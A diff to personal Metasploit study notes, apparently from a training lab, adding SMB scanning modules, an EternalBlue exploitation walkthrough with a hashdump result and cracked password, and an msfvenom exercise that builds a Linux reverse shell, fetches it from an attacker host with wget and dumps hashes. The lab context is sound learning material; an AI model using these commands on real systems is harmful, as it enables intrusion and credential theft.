@@ -74,6 +74,12 @@ The `scanner/discover/udp_sweep` module allows you to perform a quick but not ex
 **SMB Scans**
 Metasploit offers several auxiliary modules, incuding `smb_enumshares` and `smb_version` which are usefull in, f.e. corporate settings where [[Network Exploitation Basics#Server Message Block (SMB)|SMB]] is used.
 
+| Auxiliary Module             | Description                                                         |
+| ---------------------------- | ------------------------------------------------------------------- |
+| `scanner/smb/smb_enumshares` | enumerates the all available shares on the target                   |
+| `scanner/smb/smb_enumusers`  | connect to the target(s) via SMB RPC and enumerates the users on it |
+| `scanner/smb/smb_login`      | attempts to login                                                   |
+
 **NetBIOS**
 When scanning a network you should not omit services like *Network Basic Inout Output System (NetBIOS)*, which, similar to SMB, allows computers on the network to communicate, share files or send them to a printer. The name of the target might reveal its role or importance (f.e. CORP-DC, SALES, ...) or there are shared files and folders with weak passwords (f.e. admin, root, ...).
 
@@ -135,7 +141,7 @@ The `sessions` command lists all active sessions and supports a number of option
 	- 445: microsoft-ds
 	- 3389: ms-wbt-server
 2. We use the `auxiliary/scanner/smb/smb_ms17_010` to check if the SMB service on port 445 is vulnerable to the `ms17_010` exploit, which gives us a reverse shell
-3. The target is vulnerable so we use the `windows/smb/ms17_010_eternalblue` module, use `show payloads` and set the payload to `generic/shell_reverse_tcp`, run the exploit and get a reverse shell.
+3. The target is vulnerable so we use the `windows/smb/ms17_010_eternalblue` module, use `show payloads` and set the payload to `windows/x64/meterpreter/reverse_tcp`, run the exploit and get a reverse shell.
 4. We use the following commands to find the flag:
 ```
 dir
@@ -150,8 +156,8 @@ dir
 type flag.txt
 ```
 (dir displays the content of the current directory)
-5. We background the session with `STRG + Z`
-6. 
+5. We use `cat flag.txt` to read display the flag
+6. We use `hashdump` to get the password hash of the user "pirate"; 8ce9a3ebd1647fcc5e04025019f4b875, which when decrypted is "pirate123"
 ## Msfvenom
 Msfvenom allows you to create payloads in different formats (PHP, exe, dll, elf, ...) and for many systems (Apple, Windows, Android, Linux, ...) by giving access to all payloads available in the Metasploit framework.
 
@@ -188,7 +194,16 @@ When everything is set we will use `run`.
 All of these payloads are reverse payloads, so you need  the exploit/mult/handler module listening on your machine. The LHOST and LPORT parameter is the IP address of your machine and the port on which the handler will listen.
 
 **Exercise**
-
+1. We open a terminal and enter `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.2.72 LPORT=4444 -f elf > rev_shell.elf` to generate a linux reverse shell
+2. We open *Metasploit* and use the `exploit/multi/handler` module to set up a listener; we set `lhost=10.10.2.72`, `lport=4444`, `payload=linux/x86/meterpreter/reverse_tcp`
+3. We connect to the target with ssh(user:`murphy`, password: `1q2w3e4r`) and enter `sudo su` to get a root shell
+```
+ssh murphy@10.10.12.98
+```
+4. We start a http server on our machine with: `python3 -m http.server 9000` and on our target machine we use `wget http://ATTACKING_MACHINE_IP:9000/shell.elf` to get the reverse shell on it 
+5. We enter `chmod +x rev_shell.elf` into the ssh terminal to make that file executable and execute it with `./rev_shell.elf`
+6. We return to our *Metasploit* terminal where the listener is set up; background the session and search for "hashdump linux"; we get the module `post/linux/gather/hashdump`, set the session correctly and run it
+7. We get the hashes and are finished with this exercise
 # Meterpreter
 *Meterpreter* is a payload that runs on the target system and acts as an agent within a command and control architecture, meaning you will interact with the target OS and files through *Meterpreters* commands. 
 
